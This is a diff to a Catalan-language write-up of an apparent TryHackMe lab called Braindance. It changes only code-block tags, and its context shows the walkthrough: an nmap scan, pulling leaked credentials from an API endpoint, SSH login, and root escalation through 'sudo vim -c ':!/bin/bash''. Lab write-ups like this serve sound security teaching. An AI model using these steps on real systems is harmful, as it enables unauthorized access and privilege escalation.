@@ -28,7 +28,7 @@ Braindance és una petita botiga de "neurodances": clips de ball que es carregue
 
 El primer, un escaneig de ports a la ip de la màquina.
 
-```tmux
+```bash
 nmap -sC -sV MACHINE_IP
 ```
 
@@ -54,7 +54,7 @@ Ara obro bé la petició i veig que es fa la sol·licitud a `/api/dance.php?id=2
 
 ![Informació de la petició a l'apartat de xarxa](/images/writeups/TryHackMe_imágenes/Braindance-THM-imágenes/peticion_api-Braindance-THM.png)
 
-```tmux
+```bash
 curl http://MACHINE_IP/api/dance.php?id=1
 ```
 
@@ -66,7 +66,7 @@ I aquí ho tenim: l'id 1 és un clip que mai s'hauria d'haver publicat, i al cam
 
 Amb les credencials que he tret de l'API, provo de connectar-me per SSH.
 
-```tmux
+```bash
 ssh braindancer@MACHINE_IP
 ```
 
@@ -74,7 +74,7 @@ ssh braindancer@MACHINE_IP
 
 Entro sense problema. Reviso la carpeta de l'usuari i aquí tenim la primera flag.
 
-```tmux
+```bash
 ls
 cat user.txt
 ```
@@ -85,7 +85,7 @@ cat user.txt
 
 Ja dins, el primer que miro són els permisos de sudo de l'usuari.
 
-```tmux
+```bash
 sudo -l
 ```
 
@@ -93,7 +93,7 @@ sudo -l
 
 L'usuari pot executar `/usr/bin/vim` com a root sense contrasenya. Vim és un dels binaris clàssics de GTFOBins per escalar privilegis: un cop dins, es pot llançar una shell directament des del mateix editor.
 
-```tmux
+```bash
 sudo vim -c ':!/bin/bash'
 ```
 
@@ -109,7 +109,7 @@ Resumidament el que fa aquesta comanda és el següent:
 
 I amb la shell de root ja puc llegir la segona flag.
 
-```tmux
+```bash
 cd /root/
 ls
 cat /root/root.txt
